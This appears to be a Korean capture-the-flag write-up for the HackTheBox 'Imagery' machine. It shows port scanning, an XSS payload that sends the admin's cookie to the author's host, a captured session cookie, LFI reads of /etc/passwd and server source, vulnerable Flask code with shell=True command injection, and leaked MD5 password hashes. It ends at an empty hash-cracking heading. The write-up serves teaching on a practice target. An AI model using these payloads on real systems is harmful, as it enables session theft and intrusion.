---
title: "Imagery (Medium)"
date: 2025-12-10
layout: single
excerpt: "ImageryëŠ” ì¤‘ê°„ ë‚œì´ë„ ë¨¸ì‹ ìœ¼ë¡œ, ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ LFI(Local File Inclusion) ì·¨ì•½ì ì„ í†µí•´ db.json íŒŒì¼ì„ ì—´ëŒí•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ Command Injection ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³  ë¦¬ë²„ìŠ¤ ì…¸ì„ íšë“í•  ìˆ˜ ìˆë‹¤. ì´í›„ ì‹œìŠ¤í…œ ë‚´ ë°±ì—… ë””ë ‰í† ë¦¬ì—ì„œ AESë¡œ ì•”í˜¸í™”ëœ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë°±ì—…ì„ ë°œê²¬í•˜ê³ , ì´ë¥¼ ë³µí˜¸í™”í•¨ìœ¼ë¡œì¨ markë¼ëŠ” ìƒˆë¡œìš´ ì‚¬ìš©ì ê³„ì •ì„ í™•ë³´í•œë‹¤. ê³„ì •ì˜ í•´ì‹œë¥¼ í¬ë™í•˜ì—¬ ë¡œê·¸ì¸í•œ í›„, markê°€ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ charcol í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” sudo ê¶Œí•œì„ ê°€ì§€ê³  ìˆìŒì„ í™•ì¸í•œë‹¤. í•´ë‹¹ í”„ë¡œê·¸ë¨ì€ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì´ˆê¸°í™”í•  ìˆ˜ ìˆìœ¼ë©°, ì„¤ì •ì„ ë³€ê²½í•´ ë¹„ë°€ë²ˆí˜¸ ì—†ëŠ” ëª¨ë“œë¡œ ì§„ì…í•œ í›„, í¬ë¡  ì‘ì—…ì— ì•…ì„± ëª…ë ¹ì–´ë¥¼ ì‚½ì…í•¨ìœ¼ë¡œì¨ SUID ë¹„íŠ¸ê°€ ì„¤ì •ëœ /bin/bashë¥¼ ì´ìš©í•´ ìµœì¢…ì ìœ¼ë¡œ ë£¨íŠ¸ ê¶Œí•œì„ íƒˆì·¨í•  ìˆ˜ ìˆë‹¤."
author_profile: true
toc: true
toc_label: "Imagery"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/imagery/imagery.png
  teaser_home_page: true
categories: [hackthebox-linux]
tags: [htb, linux, web, lfi, command-injection, reverse-shell, pyAesCrypt, backup, hash-cracking, priv-esc, sudo, cronjob, suid, local-exploit]
---

![Imagery](/assets/htb-linux/imagery/imagery.png)

**Imagery**ëŠ” ì¤‘ê°„ ë‚œì´ë„ ë¨¸ì‹ ìœ¼ë¡œ, ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ **LFI(Local File Inclusion)** ì·¨ì•½ì ì„ í†µí•´ `db.json` íŒŒì¼ì„ ì—´ëŒí•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ **Command Injection** ì·¨ì•½ì ì„ ì‹ë³„í•˜ê³  ë¦¬ë²„ìŠ¤ ì…¸ì„ íšë“í•  ìˆ˜ ìˆë‹¤. 

ì´í›„ ì‹œìŠ¤í…œ ë‚´ ë°±ì—… ë””ë ‰í† ë¦¬ì—ì„œ **AESë¡œ ì•”í˜¸í™”ëœ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ë°±ì—…**ì„ ë°œê²¬í•˜ê³ , ì´ë¥¼ ë³µí˜¸í™”í•¨ìœ¼ë¡œì¨ `mark` ë¼ëŠ” ìƒˆë¡œìš´ ì‚¬ìš©ì ê³„ì •ì„ í™•ë³´í•œë‹¤. 

ê³„ì •ì˜ í•´ì‹œë¥¼ í¬ë™í•˜ì—¬ ë¡œê·¸ì¸í•œ í›„, `mark` ê°€ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ `charcol` í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” `sudo` ê¶Œí•œì„ ê°€ì§€ê³  ìˆìŒì„ í™•ì¸í•œë‹¤. í•´ë‹¹ í”„ë¡œê·¸ë¨ì€ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì´ˆê¸°í™”í•  ìˆ˜ ìˆìœ¼ë©°, ì„¤ì •ì„ ë³€ê²½í•´ **ë¹„ë°€ë²ˆí˜¸ ì—†ëŠ” ëª¨ë“œ**ë¡œ ì§„ì…í•œ í›„, **í¬ë¡  ì‘ì—…ì— ì•…ì„± ëª…ë ¹ì–´ë¥¼ ì‚½ì…**í•¨ìœ¼ë¡œì¨ SUID ë¹„íŠ¸ê°€ ì„¤ì •ëœ `/bin/bash`ë¥¼ ì´ìš©í•´ ìµœì¢…ì ìœ¼ë¡œ ë£¨íŠ¸ ê¶Œí•œì„ íƒˆì·¨í•  ìˆ˜ ìˆë‹¤.


# Enumeration

## Portscan

ë¨¼ì € ëŒ€ìƒ Host(`10.129.2.56`)ì— ëŒ€í•´ ê¸°ë³¸ ìŠ¤í¬ë¦½íŠ¸ì™€ ì„œë¹„ìŠ¤ ë²„ì „ íƒì§€ë¥¼ ìˆ˜í–‰í•˜ì˜€ë‹¤:

```bash
$ nmap -sC -sV 10.129.2.56 | tee nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 12:25 EST
Nmap scan report for 10.129.2.56
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.96 seconds
```

Nmap ìŠ¤ìº” ê²°ê³¼, `SSH(22)`/`HTTP(8000)` ì„œë¹„ìŠ¤ê°€ ì—´ë ¤ ìˆë‹¤. `HTTP(8000)` í¬íŠ¸ì—ì„œ ì ‘ê·¼ ê°€ëŠ¥í•œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì¡´ì¬í•¨ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

ì„œë²„ëŠ” **Werkzeug ì„œë²„(`Version 3.1.3`, `Python 3.12.7`)**ê°€ êµ¬ë™ ì¤‘ì´ë‹¤.

---

# Vulnerability Analysis

## Web Page Access

`8000` ë²ˆ í¬íŠ¸ì—ì„œ ë™ì‘í•˜ëŠ” ì›¹ ì„œë²„ì— ì ‘ì†í•´ë³´ë©´, `Imagery` ë¼ëŠ” ì´ë¦„ì˜ ì´ë¯¸ì§€ ê°¤ëŸ¬ë¦¬ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ë‚˜íƒ€ë‚œë‹¤:

![ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜](/assets/htb-linux/imagery/website.png)

ê³„ì •ì„ ìƒì„±í•˜ê³  ë¡œê·¸ì¸ì— ì„±ê³µí•˜ë©´, ì•„ë˜ì™€ ê°™ì€ ê°œì¸ ì´ë¯¸ì§€ ê°¤ëŸ¬ë¦¬ í˜ì´ì§€ê°€ ë‚˜íƒ€ë‚œë‹¤:

![ê°¤ëŸ¬ë¦¬ í˜ì´ì§€](/assets/htb-linux/imagery/login-success.png)

## XSS

ì‚¬ì´íŠ¸ í•˜ë‹¨ì˜ `Quick Links` ì˜ì—­ì„ ì‚´í´ë³´ë©´, **Report Bug** ë¼ëŠ” ë§í¬ê°€ ì¡´ì¬í•œë‹¤:

![ë²„ê·¸ ì‹ ê³ ](/assets/htb-linux/imagery/report-bug.png)

**Report Bug** ë§í¬ë¥¼ í´ë¦­í•˜ë©´, ì‚¬ìš©ìê°€ ë²„ê·¸ ë‚´ìš©ì„ ì œì¶œí•  ìˆ˜ ìˆëŠ” í˜ì´ì§€ë¡œ ì´ë™ëœë‹¤.

í•´ë‹¹ í˜ì´ì§€ëŠ” ë‘ ê°œì˜ ì…ë ¥ í•„ë“œ(`Bug Name`, `Bug Details`)ë¥¼ ì œê³µí•˜ê³  ìˆë‹¤:

![ë‘ê°œì˜ ì…ë ¥ í•„ë“œ](/assets/htb-linux/imagery/report.png)

`Bug Details` ì…ë ¥ ì¹¸ì— ë‹¤ìŒê³¼ ê°™ì€ XSS í˜ì´ë¡œë“œë¥¼ ì‚½ì…í•˜ì˜€ë‹¤:

```html
<img src=1 onerror="new Image().src='http://10.10.14.76:8000/?c='+document.cookie">
```

í˜ì´ë¡œë“œë¥¼ ì œì¶œí•œ ë’¤ ë¡œì»¬ì—ì„œ ê°„ë‹¨í•œ `Python` HTTP ì„œë²„ë¥¼ ì—´ì–´ ë‘ì—ˆë‹¤:

```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

ì ì‹œ í›„, ê´€ë¦¬ìì˜ ë¸Œë¼ìš°ì €ì—ì„œ í•´ë‹¹ í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë˜ë©´ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì„¸ì…˜ ì¿ í‚¤ê°€ ë‚´ ì„œë²„ë¡œ ì „ì†¡ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤:

```text
10.129.2.56 - - [09/Dec/2025 13:04:42] "GET /?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aThkmQ.luDWp-jeNK6VXXtTI1VSTHviQSU HTTP/1.1" 200 -
```

ì´ ì¿ í‚¤ ê°’ì„ ë¸Œë¼ìš°ì € ê°œë°œì ë„êµ¬ì— ì‚½ì…í•œ ë’¤ í˜ì´ì§€ë¥¼ ìƒˆë¡œê³ ì¹¨í•˜ë©´, ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ **Admin Panel ëŒ€ì‹œë³´ë“œ** ì— ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ëœë‹¤:

![admin ëŒ€ì‹œë³´ë“œ](/assets/htb-linux/imagery/admin.png)

## LFI

`Admin Panel` ì˜ `User Management` ì—ì„œ ê° ì‚¬ìš©ìì— ëŒ€í•´ **Download Log** ë²„íŠ¼ì´ ì¡´ì¬í•œë‹¤.

ì´ ë²„íŠ¼ì„ í´ë¦­í•˜ë©´, ì•„ë˜ì™€ ê°™ì´ í•´ë‹¹ ì‚¬ìš©ìì˜ `.log` íŒŒì¼ì´ ë‹¤ìš´ë¡œë“œëœë‹¤:

![.log íŒŒì¼ ë‹¤ìš´ë¡œë“œ](/assets/htb-linux/imagery/download-log.png)

### Client Side Logic Analysis

`Admin Panel` ì˜ ëŒ€ì‹œë³´ë“œì—ì„œ ë¸Œë¼ìš°ì €ì˜ `view-source` ê¸°ëŠ¥ì„ í†µí•´ ì†ŒìŠ¤ ì½”ë“œë¥¼ í™•ì¸í•œ ê²°ê³¼, **Download Log ë²„íŠ¼ê³¼ ì—°ê´€ëœ ë‹¤ìŒê³¼ ê°™ì€ JavaScript í•¨ìˆ˜ê°€ ë°œê²¬**ë˜ì—ˆë‹¤:

```js
function handleDownloadUserLog(username) {
    const logIdentifier = username;
    const logType = 'user';
    window.location.href = `/admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log`;
}
```

í•´ë‹¹ ì½”ë“œëŠ” ì‚¬ìš©ì ì´ë¦„ì„ ê¸°ë°˜ìœ¼ë¡œ `.log` íŒŒì¼ì„ ì§€ì •í•˜ê³ , ë‹¤ìŒê³¼ ê°™ì€ í˜•ì‹ì˜ URLë¡œ íŒŒì¼ì„ ìš”ì²­í•˜ëŠ” êµ¬ì¡°ì´ë‹¤.

ì´í›„ `Burp Suite` ë¥¼ í‚¨ í›„, ìœ„ í•¨ìˆ˜ì˜ ê²½ë¡œë¡œ `/etc/passwd` ìš”ì²­ì„ ì „ì†¡í•œ ê²°ê³¼ ë‹¤ìŒê³¼ ê°™ì´ **LFI ì·¨ì•½ì **ì´ ë°œê²¬ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤:

![LFI](/assets/htb-linux/imagery/lfi.png)

### Source Code (Command Injection)

`/proc/self/cwd/api_edit.py` ê²½ë¡œë¥¼ í†µí•´ ì„œë²„ì˜ Python ì†ŒìŠ¤ ì½”ë“œë¥¼ í™•ì¸í•œ ê²°ê³¼, ì—¬ëŸ¬ ì´ë¯¸ì§€ ê´€ë ¨ ê¸°ëŠ¥ì´ ì •ì˜ë˜ì–´ ìˆì—ˆìœ¼ë©°, ì´ ì¤‘ **`apply_visual_transform()` í•¨ìˆ˜ì—ì„œ ì·¨ì•½ì ì´ ë°œê²¬**ë˜ì—ˆë‹¤:

<details style="border: 1px solid #ccc; padding: 0.5em; border-radius: 5px;">  
    <summary style="font-weight: bold; cursor: pointer;">api_edit.py ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤:</summary>
    <br>
    <div markdown="1">

```python
from flask import Blueprint, request, jsonify, session
from config import *
import os
import uuid
import subprocess
from datetime import datetime
from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input, get_file_mimetype, _calculate_file_md5

bp_edit = Blueprint('bp_edit', __name__)

@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    if not image_id or not transform_type:
        return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to transform.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    if original_image.get('actual_mimetype') not in ALLOWED_TRANSFORM_MIME_TYPES:
        return jsonify({'success': False, 'message': f"Transformation not supported for '{original_image.get('actual_mimetype')}' files."}), 400
    original_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if original_ext not in ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM:
        return jsonify({'success': False, 'message': f"Transformation not supported for {original_ext.upper()} files."}), 400
    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        elif transform_type == 'rotate':
            degrees = str(params.get('degrees'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'saturation':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,{float(value)*100},100", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'brightness':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,100,{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'contrast':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        else:
            return jsonify({'success': False, 'message': 'Unsupported transformation type.'}), 400
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Transformed: {original_image['title']}",
            'description': f"Transformed from {original_image['title']} ({transform_type}).",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Transformed',
            'type': 'transformed',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath)
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Transformed' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Transformed'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image transformed successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Image transformation failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during transformation: {str(e)}'}), 500

@bp_edit.route('/convert_image', methods=['POST'])
def convert_image():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    target_format = request_payload.get('targetFormat')
    if not image_id or not target_format:
        return jsonify({'success': False, 'message': 'Image ID and target format are required.'}), 400
    if target_format.lower() not in ALLOWED_MEDIA_EXTENSIONS:
        return jsonify({'success': False, 'message': 'Target format not allowed.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to convert.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    current_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if target_format.lower() == current_ext:
        return jsonify({'success': False, 'message': f'Image is already in {target_format.upper()} format.'}), 400
    try:
        unique_output_filename = f"converted_{uuid.uuid4()}.{target_format.lower()}"
        output_filename_in_db = os.path.join('admin', 'converted', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, output_filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        new_file_md5 = _calculate_file_md5(output_filepath)
        if new_file_md5 is None:
            os.remove(output_filepath)
            return jsonify({'success': False, 'message': 'Failed to calculate MD5 hash for new file.'}), 500
        for img_entry in application_data['images']:
            if img_entry.get('type') == 'converted' and img_entry.get('original_id') == original_image['id']:
                existing_converted_filepath = os.path.join(UPLOAD_FOLDER, img_entry['filename'])
                existing_file_md5 = img_entry.get('md5_hash')
                if existing_file_md5 is None:
                    existing_file_md5 = _calculate_file_md5(existing_converted_filepath)
                if existing_file_md5:
                    img_entry['md5_hash'] = existing_file_md5
                    _save_data(application_data)
                if existing_file_md5 == new_file_md5:
                    os.remove(output_filepath)
                    return jsonify({'success': False, 'message': 'An identical converted image already exists.'}), 409
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Converted: {original_image['title']} to {target_format.upper()}",
            'description': f"Converted from {original_image['filename']} to {target_format.upper()}.",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Converted',
            'type': 'converted',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath),
            'md5_hash': new_file_md5
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Converted' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Converted'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image converted successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        if os.path.exists(output_filepath):
            os.remove(output_filepath)
        return jsonify({'success': False, 'message': f'Image conversion failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during conversion: {str(e)}'}), 500

@bp_edit.route('/delete_image_metadata', methods=['POST'])
def delete_image_metadata():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    if not image_id:
        return jsonify({'success': False, 'message': 'Image ID is required.'}), 400
    application_data = _load_data()
    image_entry = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not image_entry:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to modify.'}), 404
    filepath = os.path.join(UPLOAD_FOLDER, image_entry['filename'])
    if not os.path.exists(filepath):
        return jsonify({'success': False, 'message': 'Image file not found on server.'}), 404
    try:
        command = [EXIFTOOL_PATH, '-all=', '-overwrite_original', filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Metadata deleted successfully from image!'}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Failed to delete metadata: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during metadata deletion: {str(e)}'}), 500
```

</div>
</details>
<br>

í•´ë‹¹ í•¨ìˆ˜ëŠ” `testuser` ê³„ì •ë§Œ ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ ë‹¤ìŒ ì¡°ê±´ì„ í†µí•´ ê¸°ëŠ¥ì„ ì œí•œí•˜ê³  ìˆë‹¤:

```python
if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
```

ì¦‰, ì„¸ì…˜ ê°’ ì¤‘ `testuser` ìœ ì €ì˜ ì„¸ì…˜ì´ ì•„ë‹ˆê±°ë‚˜, ì„¸ì…˜ ìì²´ê°€ ì¡´ì¬í•˜ì§€ ì•Šì„ ê²½ìš°, í•´ë‹¹ í•¨ìˆ˜ëŠ” JSON í˜•íƒœì˜ ì—ëŸ¬ ë©”ì‹œì§€ë¥¼ ë°˜í™˜í•˜ê²Œ ëœë‹¤.

ê·¸ë¦¬ê³  í´ë¼ì´ì–¸íŠ¸ì˜ JSON ìš”ì²­ ë³¸ë¬¸ì—ì„œ `imageId`, `transformType` ê°’ì„ ì¶”ì¶œí•˜ì—¬ ê°ê° `image_id`, `transform_type` ë³€ìˆ˜ì— í• ë‹¹í•œë‹¤:

```python
request_payload = request.get_json()
image_id = request_payload.get('imageId')
transform_type = request_payload.get('transformType')
```

ë˜í•œ `params` ë¼ëŠ” ì´ë¦„ì˜ ì¶”ê°€ íŒŒë¼ë¯¸í„°ë„ í•¨ê»˜ ë°›ì•„ì˜¤ë©°, í•´ë‹¹ ê°’ì€ ì¡´ì¬í•˜ì§€ ì•Šì„ ê²½ìš° ê¸°ë³¸ê°’ìœ¼ë¡œ ë¹ˆ ë”•ì…”ë„ˆë¦¬ `{}` ê°€ ì„¤ì •ëœë‹¤:

```python
params = request_payload.get('params', {})
```

`transform_type` ê°’ì´ `crop` ì¼ ê²½ìš°, ì„œë²„ëŠ” `params `ë¡œ ì „ë‹¬ëœ `x`, `y`, `width`, `height` ê°’ì„ ê·¸ëŒ€ë¡œ ë¬¸ìì—´ë¡œ ë³€í™˜í•˜ì—¬ ë³€ìˆ˜ì— ì €ì¥í•œ ë’¤, ì´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ ImageMagick ëª…ë ¹ì–´ë¥¼ êµ¬ì„±í•œ í›„, `command` ë³€ìˆ˜ì— ì €ì¥í•œë‹¤.

í•˜ì§€ë§Œ `subprocess` ëª¨ë“ˆì„ í†µí•œ ì‹¤í–‰ ëª…ë ¹ì–´ì—ì„  **shell=True** ë¼ëŠ” ì˜µì…˜ì´ ì¡´ì¬í•œë‹¤.

`x`, `y`, `width`, `height` ë“± ì‚¬ìš©ì ì…ë ¥ê°’ì´ ëª…ë ¹ì–´ ë¬¸ìì—´ì— ì§ì ‘ í¬í•¨ë  ê²½ìš°, ì…¸ ëª…ë ¹ì´ ì‹¤í–‰ë  ìˆ˜ ìˆëŠ” **Command Injection** ì·¨ì•½ì  ë°œìƒì´ ê°€ëŠ¥í•´ì§„ë‹¤:

```python
unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

### Discovery of testuser Account

`/proc/self/cwd/utils.py` ê²½ë¡œì—ì„œ ì‚¬ìš©ì ì •ë³´ë¥¼ ì €ì¥ ë° ë¡œë“œí•˜ëŠ” í•¨ìˆ˜ë“¤ì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤:

```python
import json
import os
import uuid
import hashlib
import mimetypes
import re
from datetime import datetime
from urllib.parse import unquote
import ipaddress
from config import *

# ...[SKIP]...

def _load_data():
    if not os.path.exists(DATA_STORE_PATH):
        return {'users': [], 'images': [], 'bug_reports': [], 'image_collections': []}
    with open(DATA_STORE_PATH, 'r') as f:
        data = json.load(f)
    for user in data.get('users', []):
        if 'isTestuser' not in user:
            user['isTestuser'] = False
    return data

def _save_data(data):
    with open(DATA_STORE_PATH, 'w') as f:
        json.dump(data, f, indent=4)

def _hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

# ...[SKIP]...
```

`_save_data()` í•¨ìˆ˜ëŠ” `DATA_STORE_PATH` ê²½ë¡œì— ìœ„ì¹˜í•œ JSON íŒŒì¼ì— ì‚¬ìš©ì ì •ë³´ë¥¼ í¬í•¨í•œ ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” í•¨ìˆ˜ì´ë‹¤.

ë˜í•œ, `_hash_password()` í•¨ìˆ˜ì—ì„œëŠ” ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸ê°€ **MD5 í•´ì‹œ ë°©ì‹ìœ¼ë¡œ ì•”í˜¸í™”**ë˜ì–´ ì €ì¥ë¨ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.

`DATA_STORE_PATH` ê²½ë¡œì˜ ê°’ì„ í™•ì¸í•˜ê¸° ìœ„í•´ `config.py` ì†ŒìŠ¤ì½”ë“œë¥¼ ë¶„ì„í•´ë³¸ ê²°ê³¼, ë‹¤ìŒê³¼ ê°™ì€ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤:

```python
import os
import ipaddress

DATA_STORE_PATH = 'db.json'

# ...[SKIP]...
```

`db.json` íŒŒì¼ì´ ì‚¬ìš©ì ì •ë³´ê°€ ì €ì¥ëœ ì£¼ìš” ë°ì´í„° ì €ì¥ì†Œì„ì„ ì•Œ ìˆ˜ ìˆë‹¤.

ì´í›„ í•´ë‹¹ íŒŒì¼ì˜ ë‚´ìš©ì„ ë¶„ì„í•œ ê²°ê³¼, `/apply_visual_transform` ê²½ë¡œì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” **`testuser` ê³„ì •ì˜ ìê²© ì¦ëª… ì •ë³´**ê°€ í¬í•¨ë˜ì–´ ìˆëŠ” ê²ƒì„ í™•ì¸í•˜ì˜€ë‹¤:

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": []
}
```

## Hashcrack

